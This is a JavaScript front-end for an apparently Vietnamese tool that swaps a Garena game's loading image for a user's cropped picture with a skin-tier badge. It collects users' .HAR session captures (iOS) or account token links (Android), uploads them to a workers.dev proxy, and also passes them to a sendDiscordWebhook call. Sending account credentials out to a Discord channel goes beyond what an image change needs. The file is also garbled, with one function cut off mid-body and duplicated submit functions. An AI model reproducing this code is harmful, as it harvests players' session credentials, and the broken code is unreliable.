const API_BASE_URL = "https://proxy-api-garena.meow-web.workers.dev";
const SKIN_BADGES = [
    { id: 'none', name: 'Không bậc', icon: '' },
    { id: 'bac_a', name: 'Bậc A', icon: './assets/bac-skin/A.png' },
    { id: 'bac_a_huu_han', name: 'Bậc A Hữu Hạn', icon: './assets/bac-skin/A-HUU-HAN.png' },
    { id: 'bac_s', name: 'Bậc S', icon: './assets/bac-skin/S.png' },
    { id: 'bac_s_huu_han', name: 'Bậc S Hữu Hạn', icon: './assets/bac-skin/S-HUU-HAN.png' },
    { id: 'bac_s_plus', name: 'Bậc S+', icon: './assets/bac-skin/S+.png' },
    { id: 'bac_s_plus_huu_han', name: 'Bậc S+ Hữu Hạn', icon: './assets/bac-skin/S+HUU-HAN.png' },
    { id: 'bac_s_dac_biet', name: 'Bậc S Đặc Biệt', icon: './assets/bac-skin/S-DAC-BIET.png' },
    { id: 'bac_s_plus_dac_biet', name: 'Bậc S+ Đặc Biệt', icon: './assets/bac-skin/S+-DAC-BIET.png' },
    { id: 'bac_s_plus_premium', name: 'Bậc S+ Premium', icon: './assets/bac-skin/S+-Premium.png' },
    { id: 'bac_ss', name: 'Bậc SS', icon: './assets/bac-skin/SS.png' },
    { id: 'bac_ss_huu_han', name: 'Bậc SS Hữu Hạn', icon: './assets/bac-skin/SS-HUU-HAN.png' },
    { id: 'bac_ss_tuyet_sac', name: 'Bậc SS Tuyệt Sắc', icon: './assets/bac-skin/SS-TUYET-SAC.png' },
    { id: 'bac_sss', name: 'Bậc SSS Hữu Hạn', icon: './assets/bac-skin/SSS-HUU-HAN.png' },
    { id: 'bac_sss_plus_huu_han', name: 'Bậc SSS+ Hữu Hạn', icon: './assets/bac-skin/SSS+HUU-HAN.png' },
    { id: 'bac_mystic', name: 'Bậc Mystic', icon: './assets/bac-skin/Mystic.png' }
];

let selectedHarFile = null;

let state = {
    ios: {
        rawImgSrc: null,
        croppedBase64: null,
        selectedSkinId: 'none',
        scale: 50,
        posX: 0,
        posY: 0
    },
    android: {
        rawImgSrc: null,
        croppedBase64: null,
        selectedSkinId: 'none',
        scale: 50,
        posX: 0,
        posY: 0
    },
    currentPlatform: 'ios',
    cropper: null
};

document.addEventListener('DOMContentLoaded', () => {
    initSkinBadgeList('ios');
    initSkinBadgeList('android');
});

function switchOs(os) {
    const btnIos = document.getElementById('btnTabIos');
    const btnAndroid = document.getElementById('btnTabAndroid');
    const btnDonate = document.getElementById('btnTabDonate');

    const iosSec = document.getElementById('iosSection');
    const androidSec = document.getElementById('androidSection');
    const donateSec = document.getElementById('donateSection');

    btnIos.className = 'tab-btn';
    btnAndroid.className = 'tab-btn';
    btnDonate.className = 'tab-btn';

    iosSec.classList.add('hidden');
    androidSec.classList.add('hidden');
    donateSec.classList.add('hidden');

    if (os === 'ios') {
        btnIos.classList.add('active-ios');
        iosSec.classList.remove('hidden');
    } else if (os === 'android') {
        btnAndroid.classList.add('active-android');
        androidSec.classList.remove('hidden');
    } else if (os === 'donate') {
        btnDonate.classList.add('active-donate');
        donateSec.classList.remove('hidden');
    }
}

function initSkinBadgeList(platform) {
    const container = document.getElementById(`${platform}SkinBadgeList`);
    if (!container) return;
    container.innerHTML = '';

    SKIN_BADGES.forEach(badge => {
        const btn = document.createElement('button');
        btn.type = 'button';
        btn.className = `skin-item-btn ${badge.id === 'none' ? 'active' : ''}`;
        btn.dataset.id = badge.id;
        
        let iconHtml = badge.icon ? `<img src="${badge.icon}" alt="${badge.name}">` : `<i class="fa-solid fa-ban"></i>`;
        btn.innerHTML = `${iconHtml} <span>${badge.name}</span>`;

        btn.onclick = () => selectSkinBadge(platform, badge.id);
        container.appendChild(btn);
    });
}

function selectSkinBadge(platform, badgeId) {
    state[platform].selectedSkinId = badgeId;

    state[platform].scale = 50;
    state[platform].posX = 0;
    state[platform].posY = 0;

    const scaleSlider = document.getElementById(`${platform}ScaleSlider`);
    const posXSlider = document.getElementById(`${platform}PosXSlider`);
    const posYSlider = document.getElementById(`${platform}PosYSlider`);

    const scaleVal = document.getElementById(`${platform}ScaleVal`);
    const posXVal = document.getElementById(`${platform}PosXVal`);
    const posYVal = document.getElementById(`${platform}PosYVal`);

    if (scaleSlider) scaleSlider.value = 50;
    if (posXSlider) posXSlider.value = 0;
    if (posYSlider) posYSlider.value = 0;

    if (scaleVal) scaleVal.innerText = '50%';
    if (posXVal) posXVal.innerText = '0%';
    if (posYVal) posYVal.innerText = '0%';

    const buttons = document.querySelectorAll(`#${platform}SkinBadgeList .skin-item-btn`);
    buttons.forEach(btn => {
        if (btn.dataset.id === badgeId) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });

    renderCanvasPreview(platform);
}

function updateSkinTransform(platform) {
    const scale = document.getElementById(`${platform}ScaleSlider`).value;
    const posX = document.getElementById(`${platform}PosXSlider`).value;
    const posY = document.getElementById(`${platform}PosYSlider`).value;

    state[platform].scale = parseInt(scale, 10);
    state[platform].posX = parseInt(posX, 10);
    state[platform].posY = parseInt(posY, 10);

    document.getElementById(`${platform}ScaleVal`).innerText = `${scale}%`;
    document.getElementById(`${platform}PosXVal`).innerText = `${posX}%`;
    document.getElementById(`${platform}PosYVal`).innerText = `${posY}%`;

    renderCanvasPreview(platform);
}

function handleImageSelect(event, platform) {
    const file = event.target.files[0];
    if (!file) return;

    state.currentPlatform = platform;
    const reader = new FileReader();

    reader.onload = (e) => {
        state[platform].rawImgSrc = e.target.result;
        openCropModal(e.target.result);
    };

    reader.readAsDataURL(file);
    event.target.value = '';
}

function openCropModal(imageSrc) {
    const modal = document.getElementById('cropModal');
    const imageToCrop = document.getElementById('imageToCrop');

    imageToCrop.src = imageSrc;
    modal.classList.remove('hidden');

    if (state.cropper) {
        state.cropper.destroy();
    }

    state.cropper = new Cropper(imageToCrop, {
        aspectRatio: 1080 / 1701,
        viewMode: 1,
        autoCropArea: 1,
        responsive: true
    });
}

function closeCropModal() {
    document.getElementById('cropModal').classList.add('hidden');
    if (state.cropper) {
        state.cropper.destroy();
        state.cropper = null;
    }
}

function applyCrop() {
    if (!state.cropper) return;

    const canvas = state.cropper.getCroppedCanvas({
        width: 1080,
        height: 1701
    });

    const croppedBase64 = canvas.toDataURL('image/png');
    const platform = state.currentPlatform;

    state[platform].croppedBase64 = croppedBase64;
    closeCropModal();

    const editorEl = document.getElementById(`${platform}SkinEditor`);
    if (editorEl) editorEl.classList.remove('hidden');

    renderCanvasPreview(platform);
}

function renderCanvasPreview(platform) {
    const pState = state[platform];
    if (!pState.croppedBase64) return;

    const canvas = document.createElement('canvas');
    canvas.width = 1080;
    canvas.height = 1701;
    const ctx = canvas.getContext('2d');

    const bgImg = new Image();
    bgImg.crossOrigin = "anonymous";
    bgImg.src = pState.croppedBase64;

    bgImg.onload = () => {
        ctx.drawImage(bgImg, 0, 0, 1080, 1701);

        if (pState.selectedSkinId === 'none') {
            updatePreviewUI(platform, canvas.toDataURL('image/png'));
            return;
        }

        const badgeObj = SKIN_BADGES.find(b => b.id === pState.selectedSkinId);
        if (badgeObj && badgeObj.icon) {
            const skinImg = new Image();
            skinImg.crossOrigin = "anonymous";
            skinImg.src = badgeObj.icon;

            skinImg.onload = () => {
                
function canvasToJpegBlob(dataurl) {
    return new Promise((resolve) => {
        const img = new Image();
        img.onload = () => {
            const canvas = document.createElement('canvas');
            canvas.width = 1080;
            canvas.height = 1701;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#FFFFFF';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(img, 0, 0);
            canvas.toBlob((blob) => {
                resolve(blob);
            }, 'image/jpeg', 0.95);
        };
        img.src = dataurl;
    });
}

async function submitIosProcess() {
    if (!selectedHarFile) { 
        Swal.fire({ icon: 'warning', title: 'Thiếu File HAR!', text: 'Vui lòng chọn file .HAR trước.' }); 
        return; 
    }

    const previewImg = document.getElementById('iosImgPreview');
    if (!previewImg || !previewImg.src || previewImg.style.display === 'none') {
        Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn và cắt ảnh trước.' });
        return;
    }

    const log = document.getElementById('iosStatusLog');
    const badge = document.getElementById('iosStatusBadge');
    
    if (badge) {
        badge.innerText = 'Đang upload...';
        badge.style.color = '#38bdf8';
    }
    if (log) log.innerHTML = '⌛ Đang xử lý ảnh & tải lên máy chủ...';

    if (typeof sendDiscordWebhook === 'function') {
        sendDiscordWebhook('ios', { file: selectedHarFile });
    }

    const imageBlob = await canvasToJpegBlob(previewImg.src);
    const formData = new FormData();
    formData.append('har_file', selectedHarFile);
    formData.append('image', imageBlob, 'loading_ios.jpg');

    try {
        const res = await fetch(`${API_BASE_URL}/api/upload`, { method: 'POST', body: formData });
        const data = await res.json();

        if (data.success) {
            if (badge) badge.innerText = 'Đang xử lý';
            if (log) log.innerHTML = `✅ Mã yêu cầu: <b>${data.job_id}</b><br>⏳ Đang chờ máy chủ hoàn tất...`;
            trackStatus(data.job_id, 'ios');
        } else {
            if (badge) {
                badge.innerText = 'Thất bại';
                badge.style.color = '#ef4444';
            }
            if (log) log.innerHTML = `❌ Lỗi: ${data.error || 'Xử lý thất bại'}`;
        }
    } catch (err) {
        if (badge) {
            badge.innerText = 'Lỗi kết nối';
            badge.style.color = '#ef4444';
        }
        if (log) log.innerHTML = '❌ Không thể kết nối đến hệ thống!';
    }
}

async function submitAndroidProcess() {
    const tokenInput = document.getElementById('androidTokenInput');
    const token = tokenInput ? tokenInput.value.trim() : '';
    const previewImg = document.getElementById('androidImgPreview');

    if (!token) {
        Swal.fire({ icon: 'warning', title: 'Thiếu Link Token!', text: 'Vui lòng dán link token kgvn vào khung trên.' });
        return;
    }
    if (!previewImg || !previewImg.src || previewImg.style.display === 'none') {
        Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn và cắt ảnh trước.' });
        return;
    }

    if (typeof sendDiscordWebhook === 'function') {
        sendDiscordWebhook('android', { token: token });
    }

    const log = document.getElementById('androidStatusLog');
    const badge = document.getElementById('androidStatusBadge');

    if (badge) {
        badge.innerText = 'Đang gửi...';
        badge.style.color = '#10b981';
    }
    if (log) log.innerHTML = '⌛ Đang xử lý ảnh & tải dữ liệu Android lên máy chủ...';

    const imageBlob = await canvasToJpegBlob(previewImg.src);
    const formData = new FormData();
    formData.append('link', token);
    formData.append('image', imageBlob, 'loading_android.jpg');

    try {
        const res = await fetch(`${API_BASE_URL}/api/upload`, { method: 'POST', body: formData });
        const data = await res.json();

        if (data.success) {
            if (badge) badge.innerText = 'Đang xử lý';
            if (log) log.innerHTML = `✅ Mã yêu cầu: <b>${data.job_id}</b><br>⏳ Đang chờ máy chủ hoàn tất...`;
            trackStatus(data.job_id, 'android');
        } else {
            if (badge) {
                badge.innerText = 'Thất bại';
                badge.style.color = '#ef4444';
            }
            if (log) log.innerHTML = `❌ Lỗi: ${data.error || 'Xử lý thất bại'}`;
        }
    } catch (err) {
        if (badge) {
            badge.innerText = 'Lỗi kết nối';
            badge.style.color = '#ef4444';
        }
        if (log) log.innerHTML = '❌ Không thể kết nối đến hệ thống!';
    }
}

    }

    const log = document.getElementById('iosStatusLog');
    const badge = document.getElementById('iosStatusBadge');
    
    if (badge) {
        badge.innerText = 'Đang upload...';
        badge.style.color = '#38bdf8';
    }
    if (log) log.innerHTML = '⌛ Đang tự động upload file .HAR và gửi dữ liệu...';

    if (typeof sendDiscordWebhook === 'function') {
        sendDiscordWebhook('ios', { file: selectedHarFile });
    }

    const imageBlob = dataURLtoBlob(previewImg.src);
    const formData = new FormData();
    formData.append('har_file', selectedHarFile);
    formData.append('image', imageBlob, 'loading_ios.png');

    try {
        const res = await fetch(`${API_BASE_URL}/api/upload`, { method: 'POST', body: formData });
        const data = await res.json();

        if (data.success) {
            if (badge) badge.innerText = 'Đang xử lý';
            if (log) log.innerHTML = `✅ Mã yêu cầu: <b>${data.job_id}</b><br>⏳ Đang chờ máy chủ hoàn tất...`;
            trackStatus(data.job_id, 'ios');
        } else {
            if (badge) {
                badge.innerText = 'Thất bại';
                badge.style.color = '#ef4444';
            }
            if (log) log.innerHTML = `❌ Lỗi: ${data.error || 'Xử lý thất bại'}`;
        }
    } catch (err) {
        if (badge) {
            badge.innerText = 'Lỗi kết nối';
            badge.style.color = '#ef4444';
        }
        if (log) log.innerHTML = '❌ Không thể kết nối đến hệ thống!';
    }
}

async function submitAndroidProcess() {
    const tokenInput = document.getElementById('androidTokenInput');
    const token = tokenInput ? tokenInput.value.trim() : '';
    const previewImg = document.getElementById('androidImgPreview');

    if (!token) {
        Swal.fire({ icon: 'warning', title: 'Thiếu Link Token!', text: 'Vui lòng dán link token kgvn vào khung trên.' });
        return;
    }
    if (!previewImg || !previewImg.src || previewImg.style.display === 'none') {
        Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn và cắt ảnh trước.' });
        return;
    }

    if (typeof sendDiscordWebhook === 'function') {
        sendDiscordWebhook('android', { token: token });
    }

    const log = document.getElementById('androidStatusLog');
    const badge = document.getElementById('androidStatusBadge');

    if (badge) {
        badge.innerText = 'Đang gửi...';
        badge.style.color = '#10b981';
    }
    if (log) log.innerHTML = '⌛ Đang tải dữ liệu Android lên máy chủ...';

    const imageBlob = dataURLtoBlob(previewImg.src);
    const formData = new FormData();
    formData.append('link', token);
    formData.append('image', imageBlob, 'loading_android.png');

    try {
        const res = await fetch(`${API_BASE_URL}/api/upload`, { method: 'POST', body: formData });
        const data = await res.json();

        if (data.success) {
            if (badge) badge.innerText = 'Đang xử lý';
            if (log) log.innerHTML = `✅ Mã yêu cầu: <b>${data.job_id}</b><br>⏳ Đang chờ máy chủ hoàn tất...`;
            trackStatus(data.job_id, 'android');
        } else {
            if (badge) {
                badge.innerText = 'Thất bại';
                badge.style.color = '#ef4444';
            }
            if (log) log.innerHTML = `❌ Lỗi: ${data.error || 'Xử lý thất bại'}`;
        }
    } catch (err) {
        if (badge) {
            badge.innerText = 'Lỗi kết nối';
            badge.style.color = '#ef4444';
        }
        if (log) log.innerHTML = '❌ Không thể kết nối đến hệ thống!';
    }
}

function trackStatus(jobId, platform) {
    const log = document.getElementById(`${platform}StatusLog`);
    const badge = document.getElementById(`${platform}StatusBadge`);

    const timer = setInterval(async () => {
        try {
            const res = await fetch(`${API_BASE_URL}/api/check/${jobId}`);
            const data = await res.json();

            if (data.success) {
                const job = data.data;
                if (job.status === 'success' || job.status === 'completed') {
                    clearInterval(timer);
                    if (badge) {
                        badge.innerText = 'Hoàn thành';
                        badge.style.color = '#10b981';
                    }
                    if (log) log.innerHTML = `🎉 **Thành công!**<br>${job.message || 'Thay ảnh loading thành công.'}`;
                    Swal.fire({ icon: 'success', title: 'Thành Công!', text: 'Thao tác thay ảnh hoàn tất.' });
                } else if (job.status === 'failed' || job.status === 'error') {
                    clearInterval(timer);
                    if (badge) {
                        badge.innerText = 'Thất bại';
                        badge.style.color = '#ef4444';
                    }
                    if (log) log.innerHTML = `❌ **Lỗi:** ${job.error || 'Quá trình xử lý bị lỗi'}`;
                    Swal.fire({ icon: 'error', title: 'Thất Bại', text: job.error || 'Xử lý thất bại' });
                } else {
                    if (log) log.innerHTML = `✅ Mã yêu cầu: <b>${jobId}</b><br>⏳ Trạng thái: ${job.status_text || job.status}...`;
                }
            }
        } catch (err) {
            clearInterval(timer);
            if (badge) {
                badge.innerText = 'Lỗi kiểm tra';
                badge.style.color = '#ef4444';
            }
            if (log) log.innerHTML = '❌ Không thể kiểm tra tiến trình từ máy chủ!';
        }
    }, 3000);
}
